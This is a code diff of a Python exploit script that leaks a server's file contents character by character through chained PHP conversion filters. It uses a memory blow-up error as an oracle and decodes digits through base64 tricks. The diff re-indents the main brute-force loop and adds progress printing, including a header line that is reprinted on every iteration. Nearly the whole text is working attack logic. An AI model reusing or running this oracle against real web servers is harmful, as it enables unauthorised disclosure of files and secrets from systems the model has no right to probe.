@@ -299,9 +299,6 @@ ROT1 = 'convert.iconv.437.CP930'
 # Method to format strings introduced in Phase 1 for later manipulation
 BE = 'convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode'
 
-# Store output string
-o = ''
-
 def find_letter(prefix):
 	if not req(f'{prefix}|dechunk|{BLOW_UP_INF}'):
 		# a-f A-F 0-9
@@ -448,59 +445,68 @@ def find_letter(prefix):
 	else:
 		err('[-] Something wrong finding letters.')
 
+# Store output string
+o = ''
 
+""" Brute force the string for 100 chars """
 for i in range(100):
-	prefix = f'{HEADER}|{get_nth(i)}'
-	letter = find_letter(prefix)
-	# it's a number, check base64
-	if letter == '*':
-		prefix = f'{HEADER}|{get_nth(i)}|convert.base64-encode'
-		s = find_letter(prefix)
-		if s == 'M':
-			# 0 - 3
-			prefix = f'{HEADER}|{get_nth(i)}|convert.base64-encode|{R2}'
-			ss = find_letter(prefix)
-			if ss in 'CDEFGH':
-				letter = '0'
-			elif ss in 'STUVWX':
-				letter = '1'
-			elif ss in 'ijklmn':
-				letter = '2'
-			elif ss in 'yz*':
-				letter = '3'
-			else:
-				err(f'bad num ({ss})')
-		elif s == 'N':
-			# 4 - 7
-			prefix = f'{HEADER}|{get_nth(i)}|convert.base64-encode|{R2}'
-			ss = find_letter(prefix)
-			if ss in 'CDEFGH':
-				letter = '4'
-			elif ss in 'STUVWX':
-				letter = '5'
-			elif ss in 'ijklmn':
-				letter = '6'
-			elif ss in 'yz*':
-				letter = '7'
-			else:
-				err(f'bad num ({ss})')
-		elif s == 'O':
-			# 8 - 9
-			prefix = f'{HEADER}|{get_nth(i)}|convert.base64-encode|{R2}'
-			ss = find_letter(prefix)
-			if ss in 'CDEFGH':
-				letter = '8'
-			elif ss in 'STUVWX':
-				letter = '9'
-			else:
-				err(f'bad num ({ss})')
-		else:
-			err('wtf')
-
-	print(end=letter)
-	o += letter
-	sys.stdout.flush()
-
+    prefix = f'{HEADER}|{get_nth(i)}'
+    letter = find_letter(prefix)
+    
+    # It's a number
+    if letter == '*':
+        prefix = f'{HEADER}|{get_nth(i)}|convert.base64-encode'
+        s = find_letter(prefix)
+        
+        if s == 'M':
+            # 0 - 3
+            prefix = f'{HEADER}|{get_nth(i)}|convert.base64-encode|{R2}'
+            ss = find_letter(prefix)
+            if ss in 'CDEFGH':
+                letter = '0'
+            elif ss in 'STUVWX':
+                letter = '1'
+            elif ss in 'ijklmn':
+                letter = '2'
+            elif ss in 'yz*':
+                letter = '3'
+            else:
+                err(f'Bad number: {ss}')
+        
+        elif s == 'N':
+            # 4 - 7
+            prefix = f'{HEADER}|{get_nth(i)}|convert.base64-encode|{R2}'
+            ss = find_letter(prefix)
+            if ss in 'CDEFGH':
+                letter = '4'
+            elif ss in 'STUVWX':
+                letter = '5'
+            elif ss in 'ijklmn':
+                letter = '6'
+            elif ss in 'yz*':
+                letter = '7'
+            else:
+                err(f'Bad number: {ss}')
+        
+        elif s == 'O':
+            # 8 - 9
+            prefix = f'{HEADER}|{get_nth(i)}|convert.base64-encode|{R2}'
+            ss = find_letter(prefix)
+            if ss in 'CDEFGH':
+                letter = '8'
+            elif ss in 'STUVWX':
+                letter = '9'
+            else:
+                err(f'Bad number: {ss}')
+        else:
+            err('wtf')
+    
+    print("[*] Decoded characters:")
+    print(end=letter)  
+    o += letter
+    sys.stdout.flush()
+    
+print()
 """
 We are done!!!
 """
